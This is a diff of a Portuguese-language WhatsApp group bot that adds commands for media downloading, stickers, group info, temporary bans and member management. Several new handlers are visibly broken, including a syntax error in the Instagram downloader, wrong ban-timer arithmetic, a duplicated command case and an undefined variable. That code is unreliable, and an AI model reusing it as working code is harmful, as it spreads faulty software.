+let txt = `     Anime Search      \n\n*Title:* *${res.data.title}*\n*English:* *${res.data.title_english}*\n*Japanese:* *${res.data.title_japanese}*\n*Anime Type:* *${res.data.type}*\n*Adaptation:* *${res.data.source}*\n*Total Episode:* *${res.data.episodes}*\n*Status:* *${res.data.status}*\n*Ongoing:* *${res.data.airing ? 'Yes' : 'No'}*\n*Aired:* *${res.data.aired.string}*\n*Duration:* *${res.data.duration}*\n*Rating:* *${res.data.rating}*\n*Score:* *${res.data.score}*\n*Rank:* *${res.data.rank}*\n*Main Producer:* *${res.data.producers.name}*\n*Studio:* *${res.data.studios[0].name}* `
+anya.sendMessage(from, { image : { url : res.data.images.jpg.image_url}, caption : txt}, {quoted :m }) 
+})
+}
+break
 case `contar`:              
         
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
@@ -5042,7 +5740,7 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
                     anya.sendText(m.chat, `${body.slice(10)}`, m, {
                         contextInfo: {
-                            forwardingScore: 999,
+                            forwardingScore: 999999,
                             isForwarded: true
                         }
                     })
@@ -5063,7 +5761,7 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 					const kapankah = kapan[Math.floor(Math.random() * kapan.length)]
 anya.sendMessage(from, { text: `Questão : quando ${q}\nResposta : *${kapankah}*` }, { quoted: m })
 					break
-case 'swm': case 'rename': case 'stickerwm': {
+case 'swm': case 'stickerwm': {
 //addFilter(from) 
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
 if (!args.join(" ")) return m.reply(`Exemplo :\nswm anya-md|${nomedodono}`)
@@ -5230,6 +5928,15 @@ if (tes == "Vitória do jogador") {
 m.reply(pph)
 }
 break
+case 'ringtone': {
+        //if (!isCreator && !isBan) return
+		if (!text) throw `Example : ${prefix + command} black rover`
+        let { ringtone } = require('./lib/scraper')
+		let anu = await ringtone(text)
+		let result = anu[Math.floor(Math.random() * anu.length)]
+		anya.sendMessage(m.chat, { audio: { url: result.audio }, fileName: result.title+'.mp3', mimetype: 'audio/mpeg' }, { quoted: m })
+	    }
+	    break	   
 case `chance`: {
 
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
@@ -5378,7 +6085,7 @@ const dptr = `     「 🔥 ~_*PERFIL*_~ 🌈 」
 ➻ *~_CONSELHO_~* :
 ${conselho}`
 daftarimg = await getBuffer(ppimg)
-anya.sendMessage(m.chat, { image: daftarimg, caption: dptr }, { quoted: m })
+anya.sendMessage(m.chat, { image: ppnyauser, caption: dptr }, { quoted: m })
 break
 case 'logos':{
 if (args.length < 1) return m.reply('digite seu nick.\n\nexemplo: !logos alone')
@@ -5538,33 +6245,6 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 anya.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
 }
 break
-case 'play2':
-if (args.length < 1) return m.reply(`Exemplo:\n${prefix + command} Faded`)
-let Ytsearchh = [];
-const data = await yts(q);
-let anu = data.videos[Math.floor(Math.random() * data.videos.length)]
-for(let a of data.all) {
-Ytsearchh.push({
-title: a.title, description: `𝘼𝙐𝘿𝙄𝙊: ${a.author.name}\n[⏱️]DURAÇÃO: ${a.duration}`, rowId: `${prefix}ytbmp3 ${anu.url}`
-},{
-title: a.title, description: `𝙑𝙄𝘿𝙀𝙊: ${a.author.name}\n[⏱️]DURAÇÃO: ${a.duration}`, rowId: `${prefix}ytmp4 ${anu.url}`
-})
-}
-const buttonYtsearch = {
-
-title: `[❗] 𝗣𝗘𝗦𝗤𝗨𝗜𝗦𝗔: ${q} [❗]`,
-description: "Clique e Escolha Uma Opção\n",
-footerText: `${watermark}`,
-buttonText: 'ESCOLHA AQUI',
-listType: 'SINGLE_SELECT',
-sections: [
-
-{ title: `Musicas Com A Pesquisa ${q}`,  rows: Ytsearchh },
-
-]}
-const templateListYtsearch = generateWAMessageFromContent(from, proto.Message.fromObject({ "listMessage": buttonYtsearch }), {});
-anya.relayMessage(from, templateListYtsearch.message, { messageId: templateListYtsearch.key.id });
-break
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
    try {
    let set
@@ -5612,6 +6292,140 @@ if (!isAdmins && !groupOwner && !isCreator) return m.reply(mess.admin)
  anya.sendMessage(m.chat, { delete: key })
             }
             break
+case 'stickersearch': {
+   //   if (isBan) throw mess.ban
+  if (!text) return m.reply(`*Use ${prefix + command} enter query sticker*`) 
+  let noh = require('./lib/lol.js')                
+  noh.stickersearch(`${text}`).then(async (res) => {   
+  for (let x of res.sticker_url) {
+  anya.sendImageAsSticker(m.chat, x, m, { packname: `${pushname}`, author: `${nomedobot}` })      
+               }
+                }).catch((err) => {
+                    m.reply(`*${text} Not found*`)
+                })
+            }
+            break
+case 'infogrupo':
+       case 'gpinfo':
+       case 'grupoinfo':
+              if (!m.isGroup) return m.reply(mess.group)
+              try {
+                    ppgroup = await anya.profilePictureUrl(m.chat, 'image')
+                } catch {
+                    ppgroup = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
+                }
+              let ingfo = `*G R U P O I N F O*\n\n*Nome :* ${groupName}\n*ID :* ${from}\n*Criado em :* ${moment(`${groupMetadata.creation}` * 1000).tz('America/Sao_Paulo').format('DD/MM/YYYY HH:mm:ss')}\n*Criador do gp :* @${groupMetadata.owner.split('@')[0]}\n*Quantidade de admins :* ${groupAdmins.length}\n*Número de participantes :* ${groupMembers.length}\n*Descrição :* \n${groupMetadata.desc}`
+//              akame.sendMessage(from, await getBuffer(pic), image, {quoted: mek, thumbnail: null, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
+              anya.sendMessage(from, { image: { url: ppgroup}, caption: ingfo }, { quoted: m })
+             break			
+             case 'tempban':
+			if (!m.isGroup) return m.reply(mess.group)
+			if (!isAdmins) return m.reply(mess.admin)
+			if (!isBotAdmins) return m.reply(mess.Badmin)
+						if (!m.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Marque a msg da pessoa!')
+				if (args[1]=="segundos") {var tempokk = args[0]+"000"
+				} else if (args[1]=="minuto") {var tempokk = args[0]+"0000"
+				} else if (args[1]=="hora") {var tempokk = args[0]+"00000"
+				} else {return m.reply("*selecionar:*\nsegundos\nminuto\nhora")}
+				kick = m.message.extendedTextMessage.contextInfo.participant
+		 anya.groupParticipantsUpdate(m.chat, [kick], 'remove')
+			m.reply(`Membro banido com sucesso\nirei adicionalo daqui: ${args[0]} ${args[1]}`)
+				setTimeout( () => {
+				anya.groupParticipantsUpdate(m.chat, [kick], 'add')
+				m.reply(`Olá @${kick.split('@')[0]} bem vindo de volta, pfv se comporte dessa vez...`)
+				}, tempokk)
+   break		
+case 'fbdl': case 'fb': case 'facebook': case 'pesbuk': {     	    
+         
+if (!text) return m.reply('*Insira um link do facebook!*')
+if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return m.reply('*O link que você forneceu não é válido*')
+
+let bocil = require('@bochilteam/scraper')  
+bocil.facebookdlv2(`${text}`).then(async (data) => {                   
+
+let txt = `*FB DOWNLOAD*\n\n`
+
+txt += `*⬤TÍTULO :* ${data.title}\n`
+
+txt += `*⬤QUALIDADE :* ${data.result[0].quality}\n`
+
+txt += `*⬤DESCRIÇÃO :* ${data.description}\n`
+
+txt += `*⬤URL :* ${text}\n\n`
+
+txt += `*${nomedobot}*`                
+
+buf = await getBuffer(data.thumbnail)    
+
+anya.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })         
+
+for (let i of data.result) {     
+
+anya.sendMessage(m.chat, { video: { url: i.url }, jpegThumbnail:buf, caption: `*⬤ Qualidade :* ${i.quality}`}, { quoted: m })
+
+}          
+
+}).catch((err) => {
+
+m.reply(`*Falha ao baixar mídia e enviar arquivos*`)
+
+})
+
+ }
+
+ break
+case 'fbmp3': {     	    
+         
+if (!text) return m.reply('*Insira um link do facebook!*')
+if (!isUrl(args[0]) && !args[0].includes('facebook.com')) return m.reply('*O link que você forneceu não é válido*')
+              
+let bocil = require('@bochilteam/scraper')  
+bocil.facebookdlv2(`${text}`).then(async (data) => {                   
+
+let txt = `*FB DOWNLOAD*\n\n`
+
+txt += `*⬤TÍTULO :* ${data.title}\n`
+
+txt += `*⬤QUALIDADE :* ${data.result[0].quality}\n`
+
+txt += `*⬤DESCRIÇÃO :* ${data.description}\n`
+
+txt += `*⬤URL :* ${text}\n\n`
+
+txt += `*${nomedobot}*`                
+
+buf = await getBuffer(data.thumbnail)    
+
+anya.sendMessage(m.chat, { image: { url: data.thumbnail }, jpegThumbnail:buf, caption: `${txt}` }, { quoted: m })         
+
+for (let i of data.result) {     
+
+anya.sendMessage(m.chat, { audio: { url: i.url }, mimetype: 'audio/mp4' }, { quoted: m })  
+
+}          
+
+}).catch((err) => {
+
+m.reply(`*Falha ao baixar mídia e enviar arquivos*`)
+
+})
+
+ }
+
+ break
+case 'film':
+	m.reply(mess.wait)
+if (!q) return reply(`Qual filme você quer pesquisar?\nExemplo: ${prefix}film Homem-Aranha`)
+xeonkey.Film(q)
+    .then(data => {console.log(data)
+    let krl = `*❒「  Filme ${q} 」*\n\n`
+			    for (let i of data) {
+                krl += (`\n────────────────────\n\n *📍Título :* ${i.judul}\n *📟 Qualidade :* ${i.quality}\n *🖥️ Modelo : ${i.type}*\n *⌛ Carregado :* ${i.upload}\n *🌍 Fonte :* ${i.link}`)
+                }
+             //  anya.sendMessage(from, { image: { url: i[0].thumb}, caption: krl }, { quoted: fdocs })
+             m.reply(krl)
+});
+break
 case `autosticker`: {
 if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
 if (!m.isGroup) return m.reply(mess.group)
@@ -5628,8 +6442,8 @@ autosticker.splice(anu, 1)
 fs.writeFileSync(`./database/autosticker.json`, JSON.stringify(autosticker))
 } else {
              let buttons = [
-                        { buttonId: `${prefix}autosticker on`, buttonText: { displayText: `✅ON` }, type: 1 },
-                        { buttonId: `${prefix}autosticker off`, buttonText: { displayText: `⭕OFF` }, type: 1 }
+                        { buttonId: `${prefix}autosticker on`, buttonText: { displayText: `✅ ATIVAR` }, type: 1 },
+                        { buttonId: `${prefix}autosticker off`, buttonText: { displayText: `❌ DESATIVAR` }, type: 1 }
                     ]
                     await anya.sendButtonText(m.chat, buttons, `escolha uma das opções.`, `${watermark}`, m)
 
@@ -5667,10 +6481,10 @@ if (!text) return m.reply(`Example : ${prefix + command} text`)
 anu = await getBuffer(`https://violetics.pw/api/photooxy/${command}?apikey=beta&text=${text}`)
 anya.sendMessage(m.chat, { image: anu, caption: `*PHOTO OXY ${command}*` , quoted: m, contextInfo: { externalAdReply:{
   title:"anya-md",
-  body:"apenas um sacole",
+  body:"anya-md",
   showAdAttribution: true,
   mediaType:2,
-  thumbnail: fs.readFileSync(`./src/logo.jpg`) ,
+  thumbnail: fs.readFileSync(`./lib/anya.jpg`) ,
   mediaUrl:`https://wa.me/+558898204406`, 
 sourceUrl: `https://wa.me/+558898204406` }}}, {quoted: m})
 }
@@ -5721,12 +6535,48 @@ fs.writeFileSync('./database/autoreact.json', JSON.stringify(autoreact))
 m.reply('auto reação desativado com sucesso')
 } else {
   let buttonsreact = [
-  { buttonId: `${prefix}${command} on`, buttonText: { displayText: '✅ON' }, type: 1 },
-  { buttonId: `${prefix}${command} off`, buttonText: { displayText: '⭕OFF' }, type: 1 }
+  { buttonId: `${prefix}${command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 },
+  { buttonId: `${prefix}${command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
   ]
   await anya.sendButtonText(m.chat, buttonsreact, 'Clique no botão abaixo\n\nOn para ativar\nOff para desativar', `${watermark}`, m)
   }
 break
+case 'git': case 'gitclone':
+	m.reply(mess.wait)
+            let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
+            if (!args[0]) throw `Use ${prefix}gitclone repo link\nExample: https://github.com/DGXeon/CheemsBot-MD4`
+    if (!regex1.test(args[0])) throw mess.linkm
+    let [, user, repo] = args[0].match(regex1) || []
+    repo = repo.replace(/.git$/, '')
+    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
+    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
+    anya.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => m.reply(mess.error))
+    break
+case 'toqr':{
+  if (!q) return m.reply(' Inclua link ou texto!')
+   let qyuer = await qrcode.toDataURL(q, { scale: 35 })
+   let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
+   let buff = getRandom('.jpg')
+   await fs.writeFileSync('./'+buff, data)
+   let medi = fs.readFileSync('./' + buff)
+  await anya.sendMessage(from, { image: medi, caption:"Aqui está!"}, { quoted: m })
+   setTimeout(() => { fs.unlinkSync(buff) }, 10000)
+  }
+  break
+case 'swm': case 'rename': case 'roubar': case 'take': {  
+            let text1 = q.split("|")[0]
+            let text2 = q.split("|")[1]
+              if (!isQuotedSticker) return m.reply(`Responder a um adesivo com legenda ext|text\n\nExemplo: ${prefix + command} alone|anya`)   
+              if (!text1) return m.reply(`Exemplo! : !roubar alone|anya`)    
+              if (!text2) return m.reply(`Exemplo! : !roubar alone|anya`)
+               // anya.sendMessage(from, { react: { text: "â±ï¸", key: m.key }})
+             let buff = await anya.downloadMediaMessage(m.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage, 'sticker')
+             console.log(buff)
+             let proc = await writeExifStc(buff, { packname: text1, author: text2 })
+             await anya.sendMessage(from, { sticker: { url: proc } }, { quoted: m })
+             await fs.unlinkSync(proc)
+          }
+          break
 case 'masturbation': 
 case 'jahy': 
 case 'hentai': 
@@ -5885,17 +6735,17 @@ await anya.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.re
 }
 break
 case 'tiktok': case 'tiktoknowm': {
-                if (!text) throw 'Masukkan Query Link!'
+                if (!text) return m.reply('Insira o link de consulta!')
                 m.reply(mess.wait)
                 let anu = await fetchJson(`https://botcahx-rest-api.herokuapp.com/api/dowloader/tikok?url=${text}`)
                 let buttons = [
-                    {buttonId: `!menu`, buttonText: {displayText: '📖List Menu'}, type: 1},
+                    {buttonId: `!menu`, buttonText: {displayText: 'Menu '}, type: 1},
                     {buttonId: `!tiktokmp3 ${text}`, buttonText: {displayText: '♫ Audio'}, type: 1}
                 ]
                 let buttonMessage = {
                     video: { url: anu.result.video },
                     //caption: `Baixar de ${text}`,
-                    footer: `${nomedobot}`,
+                    footer: `${watermark}`,
                     buttons: buttons,
                     headerType: 5
                 }
@@ -5919,13 +6769,13 @@ m.reply('Sucesso ao desativar a mensagem de boas-vindas neste grupo')
 } else {
   if (alone5 == 'Ativado✅') {
 let buttonsk = [
-  { buttonId: `${prefix + command} off`, buttonText: { displayText: '⭕OFF' }, type: 1 }
+  { buttonId: `${prefix + command} off`, buttonText: { displayText: '❌ DESATIVAR' }, type: 1 }
   ]
   await anya.sendButtonText(m.chat, buttonsk, 'o modo de boas vindas esta ativado neste grupo, caso deseje desativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
 if (alone5 == 'Desativado❌') {
 let buttonsk = [
-  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ON' }, type: 1 }
+  { buttonId: `${prefix + command} on`, buttonText: { displayText: '✅ ATIVAR' }, type: 1 }
   ]
   await anya.sendButtonText(m.chat, buttonsk, 'o anti link esta desativado neste grupo, caso deseje ativar o comando basta clicar no botão abaixo', `${watermark}`, m)
 }
@@ -5939,11 +6789,108 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 		if (!m.isGroup) return m.reply(mess.group)
    if (!isBotAdmins) return m.reply(mess.botAdmin)
    if (!isAdmins) return m.reply(mess.admin)
-		const alonefoda = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, ``)+`@s.whatsapp.net`
-		await anya.groupParticipantsUpdate(m.chat, [alonefoda], `remove`).then((res) => m.reply(`alvo removido com sucesso`))
-	}
-	
+		{
+if (m.message.extendedTextMessage === undefined || m.message.extendedTextMessage === null) return m.reply('Responda a mensagem ou marque as pessoas que você quer remover do grupo')
+if(m.message.extendedTextMessage.contextInfo.participant !== null && m.message.extendedTextMessage.contextInfo.participant != undefined && m.message.extendedTextMessage.contextInfo.participant !== "") {
+mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid[0] ? m.message.extendedTextMessage.contextInfo.mentionedJid[0] : m.message.extendedTextMessage.contextInfo.participant
+let responseb = await anya.groupParticipantsUpdate(from, [mentioned], 'remove')
+if (responseb[0].status === "200") anya.sendMessage(from, {text: `@${mentioned.split("@")[0]} foi removido do grupo com sucesso.️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+else if (responseb[0].status === "406") anya.sendMessage(from, {text: `@${mentioned.split("@")[0]} criou esse grupo e não pode ser removido(a) do grupo️`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+else if (responseb[0].status === "404") anya.sendMessage(from, {text: `@${mentioned.split("@")[0]} já foi removido(a) ou saiu do grupo`, mentions: [mentioned, sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+else anya.sendMessage(from, {text: `Hmm parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+} else if (m.message.extendedTextMessage.contextInfo.mentionedJid != null && m.message.extendedTextMessage.contextInfo.mentionedJid != undefined) {
+mentioned = m.message.extendedTextMessage.contextInfo.mentionedJid
+if(mentioned.length > 1) {
+if(mentioned.length > groupMembers.length || mentioned.length === groupMembers.length || mentioned.length > groupMembers.length - 3) return m.reply(`Vai banir todo mundo mesmo?`)
+sexocomrato = 0
+for (let banned of mentioned) {
+await sleep(100)
+let responseb2 = await anya.groupParticipantsUpdate(from, [banned], 'remove')
+if (responseb2[0].status === "200") sexocomrato = sexocomrato + 1
+}
+anya.sendMessage(from, {text: `${sexocomrato} participantes removido do grupo`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+} else {
+let responseb3 = await anya.groupParticipantsUpdate(from, [mentioned[0]], 'remove')
+if (responseb3[0].status === "200") anya.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} foi removido do grupo com sucesso.️`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+else if (responseb3[0].status === "406") anya.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} criou esse grupo e não pode ser removido(a) do grupo️`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+else if (responseb3[0].status === "404") anya.sendMessage(from, {text: `@${mentioned[0].split("@")[0]} já foi removido(a) ou saiu do grupo`, mentions: [mentioned[0], sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+else anya.sendMessage(from, {text: `Hmm parece que deu erro️`, mentions: [sender], contextInfo:{forwardingScore:999, isForwarded:true}})
+}
+}
+}
+}
 	break
+case 'figu':
+{
+(async function () {
+var numero = `${m.sender.split('@')[0]}`
+var legenda = `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT:`
+var autor = `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` 
+if (isMedia && !m.message.videoMessage || isQuotedImage) {
+var encmedia = isQuotedImage ? m.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage : m.message.imageMessage
+rane = getRandom('.'+await getExtension(encmedia.mimetype))
+buffimg = await getFileBuffer(encmedia, 'image')
+fs.writeFileSync(rane, buffimg)
+rano = getRandom('.webp')
+exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 800:800 ${rano}`, (err) => {
+fs.unlinkSync(rane)
+// "android-app-store-link": "https://play.google.com/store/search?q=%2B55%2094%209147-2796%20%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5%F0%9F%94%A5&c=apps",
+var json = {
+"sticker-pack-name": legenda,
+"sticker-pack-publisher": autor
+}
+var exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
+var jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
+var exif = Buffer.concat([exifAttr, jsonBuff])
+exif.writeUIntLE(jsonBuff.length, 14, 4)
+let nomemeta = Math.floor(Math.random() * (99999 - 11111 + 1) + 11111)+".temp.exif"
+fs.writeFileSync(`./${nomemeta}`, exif) 
+exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
+anya.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: m})
+fs.unlinkSync(nomemeta)
+fs.unlinkSync(rano)
+})
+})
+} else if (isMedia && m.message.videoMessage.seconds < 11 || isQuotedVideo && m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 35) {
+var encmedia = isQuotedVideo ? m.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : m.message.videoMessage
+rane = getRandom('.'+await getExtension(encmedia.mimetype))
+buffimg = await getFileBuffer(encmedia, 'video')
+fs.writeFileSync(rane, buffimg)
+rano = getRandom('.webp')
+await ffmpeg(`./${rane}`)
+.inputFormat(rane.split('.')[1])
+exec(`ffmpeg -i ${rane} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 200:200 ${rano}`, (err) => {
+fs.unlinkSync(rane)
+let json = {
+"sticker-pack-name": legenda,
+"sticker-pack-publisher": autor
+}
+let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
+let jsonBuff = Buffer.from(JSON.stringify(json), "utf-8")
+let exif = Buffer.concat([exifAttr, jsonBuff])
+exif.writeUIntLE(jsonBuff.length, 14, 4)
+let nomemeta = "temp.exif"
+fs.writeFileSync(`./${nomemeta}`, exif) 
+exec(`webpmux -set exif ${nomemeta} ${rano} -o ${rano}`, () => {
+anya.sendMessage(from, {sticker: fs.readFileSync(rano)}, {quoted: m})
+fs.unlinkSync(nomemeta)
+fs.unlinkSync(rano)
+})
+})
+} else {
+m.reply(`Você precisa enviar ou marcar uma imagem ou vídeo com no máximo 10 segundos`)
+}
+})().catch(e => {
+console.log(e)
+m.reply("Hmm deu erro")
+try {
+if (fs.existsSync("temp.exif")) fs.unlinkSync("temp.exif");
+if (fs.existsSync(rano)) fs.unlinkSync(rano);
+if (fs.existsSync(media)) fs.unlinkSync(media);
+} catch {}
+})
+}
+break
 	case `add`: case `adicionar`: case `addgp`: case `adicionarnogp`: {
 		    
 		// addFilter(from)    		
@@ -5951,8 +6898,29 @@ if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você
 		if (!m.isGroup) return m.reply(mess.group)
    if (!isBotAdmins) return m.reply(mess.botAdmin)
    if (!isAdmins) return m.reply(mess.admin)
-		let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, ``)+`@s.whatsapp.net`
-		await anya.groupParticipantsUpdate(m.chat, [users], `add`).then((res) => m.reply(`adicionado com sucesso`)).catch((err) => m.reply(jsonformat(err)))
+		if(!q && m.message.extendedTextMessage === null) return m.reply('Marque a mensagem ou coloque o número de quem você quer adicionar no grupo')
+try {
+useradd = `${args.join(" ").replace(/\D/g,'')}` ? `${args.join(" ").replace(/\D/g,'')}` : m.message.extendedTextMessage.contextInfo.participant
+let id = `${useradd.replace(/\D/g,'')}`
+if(!id) return m.reply(`Número inválido`)
+let [result] = await anya.onWhatsApp(id)
+if(!result) return m.reply(`Esse número não está registrado no WhatsApp`)
+let response = await anya.groupParticipantsUpdate(from, [result.jid], "add")
+if(response[0].status == "409") {
+anya.sendMessage(from, {text: `o usuário já está no grupo, como eu vou adicionar?`, mentions: [result.jid, sender]}, {quoted:m})
+} else if(response[0].status == "403") {
+anya.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele privou a conta`, mentions: [result.jid, sender]}, {quoted:m})
+} else if(response[0].status == "408") {
+anya.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele saiu recentemente do grupo.`, mentions: [result.jid, sender]}, {quoted:m})
+} else if(response[0].status == "401") {
+anya.sendMessage(from, {text: `Não consegui adicionar o @${result.jid.split("@")[0]} porque ele bloqueou o bot`, mentions: [result.jid, sender]}, {quoted:m})
+} else if(response[0].status == "200") {
+anya.sendMessage(from, {text: `Prontinho!!`, mentions: [result.jid, sender]}, {quoted:m})
+} else {
+m.reply("erro")
+}
+} catch {
+}
 	}
 	
 	break
@@ -5988,7 +6956,7 @@ if (!isBotAdmins) return m.reply(mess.botAdmin)
 if (args[0]  === 'on'){
 if (isAntiFlood) return m.reply(`🌀 O recurso limite de caracteres até ${limitefl} já está ativo no grupo 🌀`)
 antiflood.push(from)
-fs.writeFileSync('./database/antiflood.json', JSON.stringify(antiflood))
+fs.writeFileSync('./database/antis/antiflood.json', JSON.stringify(antiflood))
 m.reply('✔️ O recurso limite de caracteres ${limitefl} foi ativado nesse grupo📝')
 } else if (args[0] === 'off'){
  if (!isAntiFlood) return m.reply('✔️ O recurso limite de caracteres não está ativado no grupo 📝')
@@ -6000,7 +6968,7 @@ position = i
 })
 if (position !== false) {
 antiflood.splice(position, 1)
-fs.writeFileSync('./database/antiflood.json', JSON.stringify(antiflood))
+fs.writeFileSync('./database/antis/antiflood.json', JSON.stringify(antiflood))
 }
 m.reply('O recurso limite de caracteres foi desativado nesse grupo ✔️')  
 }
@@ -6085,27 +7053,23 @@ let buttons = [
 })
 }
 break
-case 'ig': case 'insta': case 'igdl': case 'instagram': {
-if (!text) throw '*Please Enter Instagarm Link*' 
-if (!isUrl(args[0]) && !args[0].includes('instagram.com')) throw '*The link you provided is not valid*'
-let urlnya = text
-hx.igdl(urlnya)
-.then(async(result) => {	  
- var halo = 0		
-anya.sendMessage(m.chat, { image: { url: result.user.profilePicUrl }, jpegThumbnail: await getBuffer(result.user.profilePicUrl), caption: `*----「 INSTAGRAM DOWNLOADER 」----*\n\n*⬤ Username :* ${result.user.username}\n*⬤ Fullname :* ${result.user.fullName}\n*⬤ Followers :* ${result.user.followers}\n*⬤ Following :* ${result.user.following}\n*⬤ ID :* ${result.user.id}\n*⬤ Filetype :* ${result.medias[0].fileType}\n*⬤ Type :* ${result.medias[0].type}\n*⬤ Jumlah Media :* ${result.medias.length}\n*⬤ Url :* ${text}\n\n*${global.watermark}*` }, { quoted: m })	                                  	                      	            
-for(let i of result.medias) {		
-if(i.url.includes('mp4')){		           			    				
-let link = await getBuffer(i.url)
-anya.sendMessage(m.chat, { video: link, jpegThumbnail: await getBuffer(i.preview), caption: `*Instagram ${i.type}*` }, { quoted: m })
-} else {
-let link = await getBuffer(i.url)
-anya.sendMessage(m.chat, { image: link, jpegThumbnail: await getBuffer(i.preview), caption: `*Instagram ${i.type}*` }, { quoted: m })          
-}
- }
-}).catch((err) => m.reply(`*Wrong command, type .igreel to download it*`))
-}		
-
-break
+case "igdl":
+        {
+          var url2 = args[0];
+          if (!url)2
+            return m.reply("Você precisa enviar o link para baixar o video");
+          instagram
+            .insta_post(url2)
+            .then(async (data) => {
+              anya.sendMessage(
+                m.chat,
+                { video: { url: data.post1.url }, caption: 'aqui está seu vídeo' },
+                { quoted: m }
+              );
+            })
+            .catch(() => m.reply("ocorreu um erro"));
+        }
+        break
 case 'igreel': {	            
 if (!text) return m.reply('*cade o link?*')
 const { instagramdl, instagramdlv2, instagramdlv3 } = require('@bochilteam/scraper')
@@ -6119,42 +7083,33 @@ m.reply(`*Falha ao baixar mídia e enviar vídeos*`)
 })
 }
 break
-case 'pinterest': case 'pndl': case 'pin': {
-m.reply(mess.wait)
- if (!args.join(" ")) return m.reply("Quer procurar oq?")
- try {
- hx.pinterest(args.join(" ")).then(async(res) => {
- dripdako = res[Math.floor(Math.random() * res.length)]
- let buttons = [
- {buttonId: `!pinterest ${args.join(" ")}`, buttonText: {displayText: 'Nova imagem'}, type: 1}
- ]
- let buttonMessage = {
- image: { url: dripdako },
- caption:  `
- *TITLE:*`  + args.join(" ") 
- `*PHOTO URL:* `+dripdako,
+case `pinterest`: {
+//addFilter(from) 
+if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
+const templateMessage = {
+text: "*_AGUARDE.._*",
+footer: 'não deve demorar muito..',
+templateButtons: []
+}
 
- footer: `${nomedobot}`,
- buttons: buttons,
- headerType: 4,
- contextInfo:{externalAdReply:{
- title:`anya-md`,
- body:`anya-md`,
- showAdAttribution: true,
- thumbnail: global.thumb,
- mediaType:2,
- mediaUrl: `https://wa.me/+558898204406`,
- sourceUrl: `https://wa.me/+558898204406`
- }}
- }
- anya.sendMessage(m.chat, buttonMessage, { quoted: m })
- }).catch(_ => _)
- } catch {
